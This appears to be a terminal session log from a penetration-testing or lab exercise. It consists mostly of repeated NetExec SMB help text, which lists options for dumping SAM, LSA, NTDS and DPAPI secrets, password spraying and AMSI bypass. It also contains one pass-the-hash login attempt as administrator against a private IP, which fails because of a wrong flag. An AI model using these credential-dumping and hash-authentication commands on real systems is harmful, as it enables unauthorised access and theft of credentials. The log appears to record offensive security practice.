+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --share SHARE         specify a share (default: C$)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --smb-server-port SMB_SERVER_PORT
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] specify a server port for SMB (default: 445)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --no-smbv1            Force to disable SMBv1 in connection
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --no-admin-check      Avoid checking admin which queries the Service Control Manager
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --gen-relay-list OUTPUT_FILE
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] outputs all hosts that don't require SMB signing to the specified file
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --smb-timeout SMB_TIMEOUT
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] SMB connection timeout (default: 2)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --laps [LAPS]         LAPS authentification
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --generate-hosts-file GENERATE_HOSTS_FILE
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Generate a hosts file like from a range of IP
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --generate-krb5-file GENERATE_KRB5_FILE
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Generate a krb5 file like from a range of IP
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --generate-tgt GENERATE_TGT
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Generate a tgt ticket
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Generic Options:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --version             Display nxc version
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -t, --threads THREADS
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] set how many concurrent threads to use (default: 256)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --timeout TIMEOUT     max timeout in seconds of each thread
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --jitter INTERVAL     sets a random delay between each authentication
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Output Options:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --no-progress         do not displaying progress bar during scan
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --log LOG             export result into a custom file
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --verbose             enable verbose output
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --debug               enable debug level information
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] DNS:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -6                    Enable force IPv6
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --dns-server DNS_SERVER
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Specify DNS server (default: Use hosts file & System DNS)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --dns-tcp             Use TCP instead of UDP for DNS queries
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --dns-timeout DNS_TIMEOUT
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] DNS query timeout in seconds (default: 3)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Authentication:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -u, --username USERNAME [USERNAME ...]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] username(s) or file(s) containing usernames
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -p, --password PASSWORD [PASSWORD ...]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] password(s) or file(s) containing passwords
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -id CRED_ID [CRED_ID ...]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] database credential ID(s) to use for authentication
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --ignore-pw-decoding  Ignore non UTF-8 characters when decoding the password file
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --no-bruteforce       No spray when using file for username and password (user1 => password1,
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] user2 => password2)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --continue-on-success
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] continues authentication attempts even after successes
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --gfail-limit LIMIT   max number of global failed login attempts
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --ufail-limit LIMIT   max number of failed login attempts per username
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --fail-limit LIMIT    max number of failed login attempts per host
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Kerberos Authentication:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -k, --kerberos        Use Kerberos authentication
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --aesKey AESKEY [AESKEY ...]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] AES key to use for Kerberos Authentication (128 or 256 bits)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] (FQDN) specified in the target parameter
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Certificate Authentication:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --pfx-cert PFXCERT    Use certificate authentication from pfx file .pfx
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --pfx-base64 PFXB64   Use certificate authentication from pfx file encoded in base64
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --pfx-pass PFXPASS    Password of the pfx certificate
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --pem-cert PEMCERT    Use certificate authentication from PEM file
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --pem-key PEMKEY      Private key for the PEM format
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Modules:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -M, --module MODULE   module to use
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -o MODULE_OPTION [MODULE_OPTION ...]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] module options
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -L, --list-modules [LIST_MODULES]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] list available modules
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --options             display module options
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Credential Gathering:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --sam [{secdump,regdump}]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] dump SAM hashes from target systems
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --lsa [{secdump,regdump}]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] dump LSA secrets from target systems
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --ntds [{vss,drsuapi}]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] dump the NTDS.dit from target DCs using the specifed method
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --kerberos-keys       Also dump Kerberos AES and DES keys from target DC (NTDS.dit)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --history             Also retrieve password history from target DC (NTDS.dit)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --enabled             Only dump enabled targets from DC (NTDS.dit)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --user USERNTDS       Dump selected user from DC (NTDS.dit)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --dpapi [{nosystem,cookies} ...]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] dump DPAPI secrets from target systems, can dump cookies if you add
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] 'cookies', will not dump SYSTEM dpapi if you add nosystem
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --sccm [{wmi,disk}]   dump SCCM secrets from target systems
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --mkfile MKFILE       DPAPI option. File with masterkeys in form of {GUID}:SHA1
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --pvk PVK             DPAPI option. File with domain backupkey
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --list-snapshots [LIST_SNAPSHOTS]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Lists the VSS snapshots (default: ADMIN$)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Mapping/Enumeration:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --shares [SHARES]     Enumerate shares and access, filter on specified argument (read ; write ;
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] read,write)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --exclude-shares EXCLUDE_SHARES [EXCLUDE_SHARES ...]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --dir [DIR]           List the content of a path (default path: '')
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --interfaces          Enumerate network interfaces
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --no-write-check      Skip write check on shares (avoid leaving traces when missing delete
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] permissions)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --filter-shares FILTER_SHARES [FILTER_SHARES ...]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Filter share by access, option 'READ' 'WRITE' or 'READ,WRITE'
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --disks               Enumerate disks
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --users [USER ...]    Enumerate domain users, if a user is specified than only its information
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] is queried.
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --users-export USERS_EXPORT
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Enumerate domain users and export them to the specified file
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --groups [GROUP]      Enumerate domain groups, if a group is specified than its members are
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Enumerated
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --local-groups [GROUP]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Enumerate local groups, if a group is specified then its members are
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --computers [COMPUTER]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Enumerate computer users
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --pass-pol            dump password policy
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --rid-brute [MAX_RID]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Enumerate users by bruteforcing RIDs
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --smb-sessions        Enumerate active smb sessions
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --reg-sessions [REG_SESSIONS]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Enumerate users sessions using the Remote Registry. If a username is
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] given, filter for it. If a file is given, filter for listed usernames. If
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] no value is given, list all.
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --loggedon-users [LOGGEDON_USERS]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Enumerate logged on users, if a user is specified than a regex filter is
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] applied.
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --loggedon-users-filter LOGGEDON_USERS_FILTER
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] only search for specific user, works with regex
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --qwinsta [QWINSTA]   Enumerate user sessions. If a username is given, filter for it; if a file
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] is given, filter for listed usernames. If no value is given, list all.
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --tasklist [TASKLIST]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Enumerate running processes and filter for the specified one if specified
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --taskkill TASKKILL   Kills a specific PID or a proces name's PID's
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] WMI Queries:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --wmi-query QUERY     Issues the specified WMI query
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --wmi-namespace NAMESPACE
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] WMI Namespace (default: root\cimv2)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Spidering Shares:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --spider SHARE        share to spider
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --spider-folder FOLDER
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] folder to spider (default: .)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --content             enable file content searching
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --exclude-dirs DIR_LIST
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] directories to exclude from spidering
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --depth DEPTH         max spider recursion depth
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --only-files          only spider files
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --silent              Do not print found files/directories
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --pattern PATTERN [PATTERN ...]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] pattern(s) to search for in folders, filenames and file content
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --regex REGEX [REGEX ...]
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] regex(s) to search for in folders, filenames and file content
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] File Operations:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --put-file FILE FILE  Put a local file into remote target, ex: whoami.txt
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] \\Windows\\Temp\\whoami.txt
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --get-file FILE FILE  Get a remote file, ex: \\Windows\\Temp\\whoami.txt whoami.txt
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --append-host         append the host to the get-file filename
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Command Execution:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --exec-method {mmcexec,atexec,smbexec,wmiexec}
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --dcom-timeout DCOM_TIMEOUT
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] DCOM connection timeout (default: 5)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --get-output-tries GET_OUTPUT_TRIES
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Number of times atexec/smbexec/mmcexec tries to get results (default: 10)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --codec CODEC         Set encoding used (codec) from the target's output. If errors are
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] detected, run chcp.com at the target & map the result with
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] https://docs.python.org/3/library/codecs.html#standard-encodings and then
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] execute again with --codec and the corresponding codec (default: utf-8)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --no-output           do not retrieve command output
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -x COMMAND            execute the specified CMD command
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -X PS_COMMAND         execute the specified PowerShell command
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Powershell Script Obfuscation:
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --obfs                Obfuscate PowerShell scripts
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --amsi-bypass FILE    File with a custom AMSI bypass
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --clear-obfscripts    Clear all cached obfuscated PowerShell scripts
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --force-ps32          force PowerShell commands to run in a 32-bit process (may not apply to
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] modules)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --no-encode           Do not encode the PowerShell command ran on target
+[2026-02-06 12:24:35] [w=2:tmux] [p=%2] [OUT] as
+[2026-02-06 12:24:36] [w=2:tmux] [p=%2] [OUT] a h
+[2026-02-06 12:24:37] [w=2:tmux] [p=%2] [OUT] - ' -h 'e0fb1fb85756c24235ff238cbe81fe00'
+[2026-02-06 12:24:37] [pane=%2] [CMD_START] nxc smb 10.129.228.112 -u administrator -h 'e0fb1fb85756c24235ff238cbe81fe00'
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] usage: nxc smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--no-bruteforce] [--continue-on-success] [--gfail-limit LIMIT]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--pfx-cert PFXCERT]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--pfx-base64 PFXB64] [--pfx-pass PFXPASS] [--pem-cert PEMCERT] [--pem-key PEMKEY]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L [LIST_MODULES]] [--options]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [-H HASH [HASH ...]] [--delegate DELEGATE] [--delegate-spn DELEGATE_SPN]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--generate-st GENERATE_ST] [--self] [-d DOMAIN | --local-auth] [--port PORT]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--no-smbv1] [--no-admin-check]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--gen-relay-list OUTPUT_FILE] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--generate-hosts-file GENERATE_HOSTS_FILE]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--generate-krb5-file GENERATE_KRB5_FILE] [--generate-tgt GENERATE_TGT]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--sam [{regdump,secdump}]] [--lsa [{regdump,secdump}]] [--ntds [{drsuapi,vss}]]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--kerberos-keys] [--history | --enabled] [--user USERNTDS]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--dpapi [{nosystem,cookies} ...]] [--sccm [{wmi,disk}]] [--mkfile MKFILE]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--pvk PVK] [--list-snapshots [LIST_SNAPSHOTS]] [--shares [SHARES]]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--exclude-shares EXCLUDE_SHARES [EXCLUDE_SHARES ...]] [--dir [DIR]] [--interfaces]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--no-write-check] [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--disks]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--users [USER ...]] [--users-export USERS_EXPORT] [--groups [GROUP]]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--local-groups [GROUP]] [--computers [COMPUTER]] [--pass-pol]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--rid-brute [MAX_RID]] [--smb-sessions] [--reg-sessions [REG_SESSIONS]]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--loggedon-users [LOGGEDON_USERS]] [--loggedon-users-filter LOGGEDON_USERS_FILTER]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--qwinsta [QWINSTA]] [--tasklist [TASKLIST]] [--taskkill TASKKILL]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--wmi-query QUERY] [--wmi-namespace NAMESPACE] [--spider SHARE]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--depth DEPTH]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--only-files] [--silent] [--pattern PATTERN [PATTERN ...] |
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --regex REGEX [REGEX ...]] [--put-file FILE FILE] [--get-file FILE FILE]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--append-host] [--exec-method {wmiexec,atexec,smbexec,mmcexec}]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--dcom-timeout DCOM_TIMEOUT] [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] [--clear-obfscripts] [--force-ps32] [--no-encode]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] target [target ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] positional arguments:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] containing a list of targets, NMap XML or .Nessus file(s)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] options:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -h, --help            show this help message and exit
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -H, --hash HASH [HASH ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] NTLM hash(es) or file(s) containing NTLM hashes
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --delegate DELEGATE   Impersonate user with S4U2Self + S4U2Proxy
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --delegate-spn DELEGATE_SPN
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] SPN to use for S4U2Proxy, if not specified the SPN used will be
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] cifs/<target>
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --generate-st GENERATE_ST
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Store the S4U Service Ticket in the specified file
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --self                Only do S4U2Self, no S4U2Proxy (use with delegate)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -d, --domain DOMAIN   domain to authenticate to
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --local-auth          authenticate locally to each target
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --port PORT           SMB port (default: 445)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --share SHARE         specify a share (default: C$)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --smb-server-port SMB_SERVER_PORT
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] specify a server port for SMB (default: 445)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --no-smbv1            Force to disable SMBv1 in connection
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --no-admin-check      Avoid checking admin which queries the Service Control Manager
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --gen-relay-list OUTPUT_FILE
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] outputs all hosts that don't require SMB signing to the specified file
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --smb-timeout SMB_TIMEOUT
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] SMB connection timeout (default: 2)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --laps [LAPS]         LAPS authentification
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --generate-hosts-file GENERATE_HOSTS_FILE
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Generate a hosts file like from a range of IP
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --generate-krb5-file GENERATE_KRB5_FILE
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Generate a krb5 file like from a range of IP
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --generate-tgt GENERATE_TGT
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Generate a tgt ticket
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Generic Options:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --version             Display nxc version
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -t, --threads THREADS
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] set how many concurrent threads to use (default: 256)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --timeout TIMEOUT     max timeout in seconds of each thread
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --jitter INTERVAL     sets a random delay between each authentication
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Output Options:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --no-progress         do not displaying progress bar during scan
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --log LOG             export result into a custom file
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --verbose             enable verbose output
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --debug               enable debug level information
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] DNS:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -6                    Enable force IPv6
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --dns-server DNS_SERVER
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Specify DNS server (default: Use hosts file & System DNS)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --dns-tcp             Use TCP instead of UDP for DNS queries
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --dns-timeout DNS_TIMEOUT
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] DNS query timeout in seconds (default: 3)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Authentication:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -u, --username USERNAME [USERNAME ...]
